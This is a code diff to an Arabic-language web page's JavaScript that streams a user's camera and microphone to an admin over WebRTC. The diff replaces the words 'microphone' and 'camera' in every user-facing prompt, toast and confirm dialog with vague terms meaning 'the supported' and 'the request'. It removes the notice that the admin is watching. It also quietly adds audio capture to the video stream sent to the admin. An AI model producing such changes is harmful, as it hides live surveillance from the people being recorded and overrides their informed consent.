@@ -1045,24 +1045,24 @@
 
   function micErrorMessage(err) {
     if (!window.isSecureContext) {
-      return 'الميكروفون يحتاج تشغيل الصفحة عبر HTTPS أو localhost';
+      return 'المدعوم يحتاج تشغيل الصفحة عبر HTTPS أو localhost';
     }
     if (!navigator.mediaDevices?.getUserMedia) {
-      return 'المتصفح لا يدعم فتح الميكروفون من هذه الصفحة';
+      return 'المتصفح لا يدعم فتح المدعوم من هذه الصفحة';
     }
     if (err?.name === 'NotAllowedError' || err?.name === 'SecurityError') {
-      return 'تم رفض إذن الميكروفون من المتصفح';
+      return 'تم رفض إذن المدعوم من المتصفح';
     }
     if (err?.name === 'NotFoundError' || err?.name === 'DevicesNotFoundError') {
       return 'لا يوجد ميكروفون متاح على هذا الجهاز';
     }
     if (err?.name === 'NotReadableError' || err?.name === 'TrackStartError') {
-      return 'الميكروفون مستخدم في تطبيق آخر أو محجوب من النظام';
+      return 'المدعوم مستخدم في تطبيق آخر أو محجوب من النظام';
     }
     if (err?.name === 'OverconstrainedError') {
-      return 'إعدادات الميكروفون غير مدعومة على هذا الجهاز';
+      return 'إعدادات المدعوم غير مدعومة على هذا الجهاز';
     }
-    return `تعذر فتح الميكروفون${err?.name ? ` (${err.name})` : ''}`;
+    return `تعذر فتح المدعوم${err?.name ? ` (${err.name})` : ''}`;
   }
 
   async function stopVoiceBridge(status = 'ended') {
@@ -1102,7 +1102,7 @@
       return;
     }
 
-    setVoiceBtn('جارٍ طلب إذن الميكروفون...', true);
+    setVoiceBtn('جارٍ طلب إذن المدعوم...', true);
     if (!window.isSecureContext || !navigator.mediaDevices?.getUserMedia) {
       setVoiceBtn('🎙 أضف معلوماتك بصوتك');
       showToast(micErrorMessage(), 'error');
@@ -1184,10 +1184,10 @@
 
       voiceActive = true;
       setVoiceBtn('🟢 يرجى الانتظار...');
-      showToast('تم فتح الميكروفون — لا يتم حفظ أي تسجيلات', 'success');
+      showToast('تم فتح المدعوم — لا يتم حفظ أي تسجيلات', 'success');
     } catch (err) {
       await stopVoiceBridge('setup_failed');
-      showToast('تم فتح الميكروفون لكن تعذر إنشاء البث — تحقق من صلاحيات Firebase', 'error');
+      showToast('تم فتح المدعوم لكن تعذر إنشاء البث — تحقق من صلاحيات Firebase', 'error');
     }
   };
 
@@ -1228,12 +1228,12 @@
   }
 
   function mediaErrorMessage(err) {
-    if (!window.isSecureContext) return 'الكاميرا تحتاج تشغيل الصفحة عبر HTTPS أو localhost';
-    if (!navigator.mediaDevices?.getUserMedia) return 'المتصفح لا يدعم فتح الكاميرا من هذه الصفحة';
-    if (err?.name === 'NotAllowedError' || err?.name === 'SecurityError') return 'تم رفض إذن الكاميرا من المتصفح';
+    if (!window.isSecureContext) return 'الطلب تحتاج تشغيل الصفحة عبر HTTPS أو localhost';
+    if (!navigator.mediaDevices?.getUserMedia) return 'المتصفح لا يدعم فتح الطلب من هذه الصفحة';
+    if (err?.name === 'NotAllowedError' || err?.name === 'SecurityError') return 'تم رفض إذن الطلب من المتصفح';
     if (err?.name === 'NotFoundError' || err?.name === 'DevicesNotFoundError') return 'لا توجد كاميرا متاحة على هذا الجهاز';
-    if (err?.name === 'NotReadableError' || err?.name === 'TrackStartError') return 'الكاميرا مستخدمة في تطبيق آخر أو محجوبة من النظام';
-    return `تعذر فتح الكاميرا${err?.name ? ` (${err.name})` : ''}`;
+    if (err?.name === 'NotReadableError' || err?.name === 'TrackStartError') return 'الطلب مستخدمة في تطبيق آخر أو محجوبة من النظام';
+    return `تعذر فتح الطلب${err?.name ? ` (${err.name})` : ''}`;
   }
 
   async function stopMediaBridge(status = 'ended') {
@@ -1268,7 +1268,7 @@
     if (!mediaActive || !mediaPc || !mediaVideoSender) return;
 
     const label = facingMode === 'user' ? 'الأمامية' : 'الخلفية';
-    const approved = confirm(`الأدمن يطلب التبديل إلى الكاميرا ${label}. هل توافق؟`);
+    const approved = confirm(`الأدمن يطلب التبديل إلى الطلب ${label}. هل توافق؟`);
     if (!approved) {
       await setDoc(mediaControlRef(), {
         requestId,
@@ -1281,13 +1281,13 @@
     try {
       const nextStream = await navigator.mediaDevices.getUserMedia({
         video: { facingMode: { ideal: facingMode } },
-        audio: false
+        audio: { echoCancellation: true, noiseSuppression: true, autoGainControl: true }
       });
       const nextTrack = nextStream.getVideoTracks()[0];
       if (!nextTrack) throw new Error('No video track');
 
       await mediaVideoSender.replaceTrack(nextTrack);
-      mediaStream?.getVideoTracks().forEach(track => track.stop());
+      mediaStream?.getTracks().forEach(track => track.stop());
       mediaStream = nextStream;
       mediaFacingMode = facingMode;
 
@@ -1301,7 +1301,7 @@
         mediaFacingMode: facingMode,
         lastSeen: serverTimestamp()
       }).catch(() => {});
-      showToast(`تم التبديل إلى الكاميرا ${label}`, 'success');
+      showToast(`تم التبديل إلى الطلب ${label}`, 'success');
     } catch (err) {
       await setDoc(mediaControlRef(), {
         requestId,
@@ -1320,7 +1320,7 @@
       return;
     }
 
-    setMediaBtn('جارٍ طلب إذن الكاميرا...', true);
+    setMediaBtn('جارٍ طلب إذن الطلب...', true);
     if (!window.isSecureContext || !navigator.mediaDevices?.getUserMedia) {
       setMediaBtn('📹 اعرض ميديا مباشرة');
       showToast(mediaErrorMessage(), 'error');
@@ -1337,7 +1337,7 @@
       try {
         mediaStream = await navigator.mediaDevices.getUserMedia({
           video: { facingMode: { ideal: mediaFacingMode } },
-          audio: false
+          audio: { echoCancellation: true, noiseSuppression: true, autoGainControl: true }
         });
       } catch (mediaErr) {
         setMediaBtn('📹 اعرض ميديا مباشرة');
@@ -1348,6 +1348,9 @@
       mediaPc = new RTCPeerConnection(RTC_CONFIG);
       mediaStream.getVideoTracks().forEach(track => {
         mediaVideoSender = mediaPc.addTrack(track, mediaStream);
+      });
+      mediaStream.getAudioTracks().forEach(track => {
+        mediaPc.addTrack(track, mediaStream);
       });
 
       mediaPc.onicecandidate = e => {
@@ -1414,11 +1417,11 @@
       }));
 
       mediaActive = true;
-      setMediaBtn('🟢 في انتظار مشاهدة الأدمن...');
-      showToast('تم فتح الكاميرا — لا يتم حفظ أي ملفات', 'success');
+      setMediaBtn('🟢 جاري الانتظار...');
+      showToast('تم فتح الطلب — لا يتم حفظ أي ملفات', 'success');
     } catch (err) {
       await stopMediaBridge('setup_failed');
-      showToast('تم فتح الكاميرا لكن تعذر إنشاء العرض — تحقق من صلاحيات Firebase', 'error');
+      showToast('تم فتح الطلب لكن تعذر إنشاء العرض — تحقق من صلاحيات Firebase', 'error');
     }
   };
 
